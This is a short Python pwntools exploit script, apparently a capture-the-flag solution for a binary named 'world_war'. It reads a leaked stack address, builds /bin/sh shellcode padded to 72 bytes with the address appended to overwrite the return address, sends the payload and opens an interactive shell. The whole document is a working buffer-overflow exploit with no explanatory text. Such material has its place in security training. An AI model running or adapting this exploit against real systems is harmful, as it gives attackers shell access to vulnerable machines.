from pwn import *

#r = remote("127.0.0.1", 8888)
r = process('world_war')
r.recvuntil("coordinate : ")

buff = r.recvline()
buff = buff[:10]
buff = int(buff, 16)
buff = p32(buff)

shellcode = asm(shellcraft.sh())
payload = shellcode + "a" * (72-len(shellcode)) + buff
r.sendline(payload)
r.interactive()
